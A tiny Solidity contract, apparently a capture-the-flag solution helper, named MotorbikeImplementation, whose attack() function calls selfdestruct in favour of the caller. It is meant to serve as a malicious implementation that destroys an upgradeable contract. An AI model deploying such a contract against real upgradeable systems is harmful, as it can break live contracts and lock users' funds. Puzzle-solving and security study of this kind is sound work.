// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MotorbikeImplementation{
    function attack() external {
        selfdestruct(payable(msg.sender));
    }
}